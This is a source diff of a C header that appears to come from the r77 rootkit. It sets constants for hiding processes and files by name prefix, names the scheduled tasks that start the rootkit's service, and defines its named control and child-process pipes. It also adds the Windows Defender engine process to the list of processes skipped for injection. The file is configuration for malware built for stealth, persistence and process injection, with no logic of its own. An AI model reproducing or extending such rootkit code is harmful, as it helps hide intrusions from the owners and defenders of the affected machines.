@@ -1,7 +1,7 @@
 #ifndef _R77DEF_H
 #define _R77DEF_H
 
-// These preprocessor definitions must match the constants in GlobalAssemblyInfo.cs
+// These preprocessor definitions must match the constants in R77Const.cs
 
 /// <summary>
 /// The prefix for name based hiding (e.g. processes, files, etc...).
@@ -26,40 +26,31 @@
 #define R77_HELPER_SIGNATURE					0x7268
 
 /// <summary>
-/// Name for the scheduled task that starts the r77 service for 32-bit processes.
+/// Name for the scheduled task that starts the r77 service on 32-bit operating systems.
 /// </summary>
 #define R77_SERVICE_NAME32						HIDE_PREFIX L"svc32"
 /// <summary>
-/// Name for the scheduled task that starts the r77 service for 64-bit processes.
+/// Name for the scheduled task that starts the r77 service on 64-bit operating systems.
 /// </summary>
 #define R77_SERVICE_NAME64						HIDE_PREFIX L"svc64"
+// Note: The name of the scheduled task is different between x86 and x64 OS, because in prior r77 versions, there were two r77 service processes.
 
 /// <summary>
-/// Name for the named pipe that notifies the 32-bit r77 service about new child processes.
+/// Name for the named pipe that notifies the r77 service about new child processes.
 /// </summary>
-#define CHILD_PROCESS_PIPE_NAME32				L"\\\\.\\pipe\\" HIDE_PREFIX L"childproc32"
-/// <summary>
-/// Name for the named pipe that notifies the 64-bit r77 service about new child processes.
-/// </summary>
-#define CHILD_PROCESS_PIPE_NAME64				L"\\\\.\\pipe\\" HIDE_PREFIX L"childproc64"
+#define CHILD_PROCESS_PIPE_NAME					L"\\\\.\\pipe\\" HIDE_PREFIX L"childproc"
 
 /// <summary>
 /// Name for the named pipe that receives commands from external processes.
 /// </summary>
 #define CONTROL_PIPE_NAME						L"\\\\.\\pipe\\" HIDE_PREFIX L"control"
-/// <summary>
-/// Name for the internally used named pipe of the 64-bit r77 service that receives redirected commands from the 32-bit r77 service.
-/// <para>Do not use! Always use CONTROL_PIPE_NAME.</para>
-/// </summary>
-#define CONTROL_PIPE_REDIRECT64_NAME			L"\\\\.\\pipe\\" HIDE_PREFIX L"control_redirect64"
 
 /// <summary>
 /// Specifies a list of processes that will not be injected.
 /// By default, this list includes processes that are known to cause problems.
 /// To customize this list, add custom entries and recompile.
 /// </summary>
-#define PROCESS_EXCLUSIONS						{ L"MSBuild.exe" }
-// Example: { L"MSBuild.exe", L"your_app.exe", L"another_app.exe" }
+#define PROCESS_EXCLUSIONS						{ L"MsMpEng.exe", L"MSBuild.exe" }
 
 /// <summary>
 /// The control code that terminates the r77 service.
